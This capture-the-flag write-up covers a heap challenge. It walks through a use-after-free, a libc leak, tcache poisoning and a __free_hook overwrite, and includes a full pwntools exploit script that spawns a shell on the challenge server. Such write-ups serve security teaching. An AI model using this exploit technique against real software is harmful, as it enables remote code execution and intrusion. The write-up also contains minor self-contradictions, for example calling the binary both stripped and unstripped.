CTF WRITEUP — CORRODED CROWN

────────────────────────────────────────────────────────────

1. CHALLENGE OVERVIEW
────────────────────────
NAME: Corroded Crown

CATEGORY: Pwn (Heap Exploitation)

DIFFICULTY: Easy

PLATFORM: Cyber Apocalypse 2026 / HTB

DESCRIPTION:
A straightforward heap-based exploitation challenge featuring a "relic management" menu system with obvious use-after-free vulnerabilities on malloc/free/read/write operations. The binary ships with its own glibc version to ensure predictable, consistent heap behavior. Objective: abuse the UAF to leak libc, tcache-poison, overwrite `__free_hook`, and spawn a shell to retrieve the flag. No tricks, no safe-linking, no hidden complexities.

────────────────────────────────────────────────────────────

2. INITIAL RECON / ENTRY POINT
───────────────────────────────
STARTING POINT:
- Binary: `corroded_crown` (stripped, PIE, Full RELRO, canary enabled)
- Support files: custom `glibc/libc.so.6` and `glibc/ld-linux-x86-64.so.2`
- Challenge runs locally with provided libc via RUNPATH

FIRST OBSERVATIONS:
- Interactive menu: Forge (allocate) / Inscribe (write) / Inspect (read) / Destroy (free)
- Menu operations reference "shelves" (indices into an allocation array)
- Binary appears to be managing relics via a simple allocation tracker

FIRST ACTIONS:
```bash
# Run the binary locally
./corroded_crown

# Checksec output
checksec --file=./corroded_crown
# Shows: PIE, Full RELRO, canary, NX unknown (executable stack present)
```

Interacting with the menu revealed straightforward operations:
```
1. Forge (index, size)   → malloc(size)
2. Inscribe (index, data) → write to shelf[index]
3. Inspect (index)       → read and print shelf[index]
4. Destroy (index)       → free(shelf[index])
```

────────────────────────────────────────────────────────────

3. ANALYSIS / INVESTIGATION
────────────────────────────
STATIC ANALYSIS:
- Binary is not stripped (symbols present), making function identification easier
- Custom allocator wrapper — each shelf operation maps directly to libc malloc/free
- No apparent bounds checking or use-after-free guards in the code

DYNAMIC ANALYSIS:
Testing with gdb/pwntools:
```python
# Allocate chunk 0, size 0x50
# Allocate chunk 1, size 0x50
# Free chunk 0
# Read chunk 0 (should fail or crash if guarded, but doesn't)
```

**KEY FINDING:** After freeing a chunk, `Inspect` still allows reading its contents. Additionally, `Inscribe` allows writing to a freed chunk's location. This is a textbook **use-after-free** vulnerability.

THOUGHT PROCESS:
- The lack of pointer cleanup after free means the shelf array still holds pointers to freed memory
- The absence of validity checks in Inspect/Inscribe means we can read and write to those freed locations
- This gives both an **arbitrary-read** and **arbitrary-write** primitive — enough for full exploitation

────────────────────────────────────────────────────────────

4. VULNERABILITY IDENTIFICATION
───────────────────────────────
ROOT CAUSE:
Use-After-Free (UAF) on heap allocations — freed chunks remain accessible via the shelf array

WHY IT WORKS:
1. `Destroy()` calls `free()` on the chunk but never NULLs the pointer in the shelf array
2. `Inspect()` and `Inscribe()` do not verify whether the shelf has been freed
3. No metadata or flags track allocation status

AFFECTED COMPONENT:
- Shelf array (allocation tracker)
- `Inspect()` function (lacks freed-check)
- `Inscribe()` function (lacks freed-check)

CHAIN:
```
4.1 [Primary] UAF-Read via Inspect
    └─ Read freed chunk contents
    └─ Use: leak libc pointers from unsorted-bin chunk

4.2 [Primary] UAF-Write via Inscribe
    └─ Write to freed chunk contents
    └─ Use: tcache-poison by overwriting freed chunk's fd pointer

4.3 [Secondary] Free() calls __free_hook
    └─ __free_hook is a glibc function pointer invoked during free
    └─ Use: after poisoning and overwriting it with system(), 
           any subsequent free triggers system(ptr)
```

────────────────────────────────────────────────────────────

5. EXPLOITATION METHOD
────────────────────────
STRATEGY:
1. **Leak libc** using unsorted-bin UAF read
2. **Poison tcache** by UAF-writing to an fd pointer
3. **Overwrite `__free_hook`** with system address
4. **Trigger RCE** by freeing a chunk containing "/bin/sh"

TOOLS USED:
- pwntools (for interaction, packing, ELF parsing)
- gdb (for local debugging)
- /proc/<pid>/maps (for verifying libc base locally)

STEPS:

**Step 1: Unsorted-Bin Leak**
```python
# Allocate a large chunk (0x500 — too big for tcache)
do_forge(0, 0x500)

# Allocate a small chunk after it (barrier to prevent top consolidation)
do_forge(6, 0x20)

# Free the large chunk → goes to unsorted bin with fd/bk pointers
do_destroy(0)

# UAF-read: inspect the freed chunk
leak_line = do_inspect(0)  # Read the main_arena pointers
leak_val = u64(leak_line[:8])

# Compute libc base
MAIN_ARENA_OFFSET = 0x1ecbd0  # verified against bundled libc
libc_base = leak_val - MAIN_ARENA_OFFSET - 0x10
free_hook = libc_base + 0x1eee48
system_addr = libc_base + 0x52290
```

**Step 2: Tcache Poisoning**
```python
# Allocate and free two small chunks (0x60)
do_forge(1, 0x60)
do_forge(2, 0x60)
do_destroy(1)
do_destroy(2)
# tcache[0x70]: chunk2 -> chunk1 -> NULL

# UAF-write: overwrite chunk2's fd with __free_hook address
do_inscribe(2, p64(free_hook))
# tcache[0x70]: chunk2 -> __free_hook -> NULL (in attacker's view)

# Pop chunk2, then pop __free_hook (as a fake allocation)
do_forge(3, 0x60)   # receives chunk2
do_forge(4, 0x60)   # receives pointer to __free_hook
```

**Step 3: Overwrite `__free_hook`**
```python
# Non-UAF write into shelf[4] (which points at __free_hook)
do_inscribe(4, p64(system_addr))
# __free_hook now contains pointer to system()
```

**Step 4: Trigger RCE**
```python
# Allocate a chunk, write "/bin/sh\0" into it
do_forge(5, 0x30)
do_inscribe(5, b'/bin/sh\x00')

# Free it: free(ptr) → calls __free_hook(ptr) → system("/bin/sh")
do_destroy(5)

# Now in an interactive shell
io.interactive()
```

PAYLOADS / COMMANDS:

**Main exploit script:**
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN  = './corroded_crown'
LIBC = './glibc/libc.so.6'
LD   = './glibc/ld-linux-x86-64.so.2'

def start():
    if args.REMOTE:
        return remote(args.HOST or '154.57.164.82', int(args.PORT or 31861))
    else:
        return process([LD, BIN])

io = start()

def menu(choice):
    io.sendlineafter(b'> ', str(choice).encode())

def do_forge(shelf, size):
    menu(1)
    io.sendlineafter(b'(index): ', str(shelf).encode())
    io.sendlineafter(b'(size): ', str(size).encode())

def do_inscribe(shelf, data):
    menu(2)
    io.sendlineafter(b'(index): ', str(shelf).encode())
    io.recvuntil(b'bytes):\n')
    io.send(data)

def do_inspect(shelf):
    menu(3)
    io.sendlineafter(b'(index): ', str(shelf).encode())
    io.recvuntil(b'Relic [%d]: ' % shelf)  # Skip label
    return io.recvline()

def do_destroy(shelf):
    menu(4)
    io.sendlineafter(b'(index): ', str(shelf).encode())

# Step 1: Leak libc
do_forge(0, 0x500)
do_forge(6, 0x20)      # Barrier chunk
do_destroy(0)
leak_val = u64(do_inspect(0).rstrip(b'\n')[:8].ljust(8, b'\x00'))

MAIN_ARENA_OFFSET = 0x1ecbd0
libc_base   = leak_val - MAIN_ARENA_OFFSET - 0x10
free_hook   = libc_base + 0x1eee48
system_addr = libc_base + 0x52290

log.info(f"libc_base: {hex(libc_base)}")
log.info(f"free_hook: {hex(free_hook)}")
log.info(f"system: {hex(system_addr)}")

# Step 2: Tcache poison
do_forge(1, 0x60)
do_forge(2, 0x60)
do_destroy(1)
do_destroy(2)
do_inscribe(2, p64(free_hook))
do_forge(3, 0x60)
do_forge(4, 0x60)

# Step 3: Overwrite __free_hook
do_inscribe(4, p64(system_addr))

# Step 4: Trigger shell
do_forge(5, 0x30)
do_inscribe(5, b'/bin/sh\x00')
do_destroy(5)

io.interactive()
```

**Run locally:**
```bash
python3 exploit5.py
```

**Run remotely:**
```bash
python3 exploit5.py REMOTE
```

ITERATIONS:
1. **First attempt:** Leaked value was 0x0 → unsorted-bin chunk was merging into top
   - **Fix:** Added barrier chunk (shelf 6) after chunk 0
   
2. **Second attempt:** Leak was garbage text bytes instead of real pointer
   - **Fix:** Modified `do_inspect()` to skip the "[*] Relic [N]: " label via `recvuntil()`
   
3. **Third attempt:** libc base was off by 0x50 bytes (% 0x1000 != 0)
   - **Fix:** Computed actual offset using `/proc/<pid>/maps` and verified `MAIN_ARENA_OFFSET = 0x1ecbd0`
   
4. **Fourth attempt:** Shell started but failed with "GLIBC_2.33 not found" errors
   - **Fix:** Removed `LD_LIBRARY_PATH` env override from `process()` call; target's RUNPATH handles libc loading

────────────────────────────────────────────────────────────

6. FLAG RETRIEVAL
──────────────────
FLAG:
```
HTB{h34p_l3v3ls_undef1n3d}
```

LOCATION:
- File: `/home/flag.txt` on the remote challenge server
- Retrieved via interactive shell spawned by the `system("/bin/sh")` call

EXTRACTION METHOD:
1. Ran exploit against remote: `python3 exploit5.py REMOTE`
2. Obtained interactive shell prompt after `io.interactive()`
3. Executed: `cat flag.txt`
4. Flag printed to stdout

────────────────────────────────────────────────────────────

7. ALTERNATIVE PATHS (OPTIONAL)
   ───────────────────────────────
**Unintended: Simpler `__malloc_hook` hijacking**
- If libc version supported it, could overwrite `__malloc_hook` instead
- Less common in modern glibc (removed in 2.34+)

**Unintended: FSOP (_IO_FILE exploitation)**
- If `__free_hook` was somehow protected, could target FILE structure
- More complex, not necessary here

**Faster: Skip barrier chunk**
- If unsorted-bin consolidation behavior is understood upfront,
  skip the barrier chunk step
- In practice, the barrier is cheap and safer

────────────────────────────────────────────────────────────

8. KEY TAKEAWAYS
   ────────────────
TECHNICAL LESSON:
- **Vulnerability Class:** Use-After-Free (UAF) on heap allocations
- **Core Weakness:** Freed pointers not cleared; no access-control on freed chunks
- **Exploitation Basis:** Arbitrary-read (leak libc) + arbitrary-write (tcache poison + hook hijack)

MENTAL MODEL:
- **UAF-read + UAF-write = full exploitation** — this is the pattern
  1. Use read to leak libc (bypass ASLR)
  2. Use write to corrupt heap metadata (tcache poisoning)
  3. Use corrupted metadata to hijack function pointers (__free_hook, etc.)
  
- Once you have both primitives, the exploit is mechanical — no deep glibc knowledge required
- Always verify computed addresses (page alignment check: `% 0x1000 == 0`)

APPLICATION:
- **Real-world:** Validates importance of pointer cleanup and freed-memory access guards
- **CTF Pattern:** UAF is foundational; mastering it unlocks most modern heap challenges
- **Future CTFs:** 
  - Look for malloc/free wrappers without proper state tracking
  - Test read/write on recently freed allocations
  - Compute libc offsets empirically rather than trusting defaults
  - Watch for environment leakage (LD_LIBRARY_PATH, etc.) in subprocess spawning

────────────────────────────────────────────────────────────
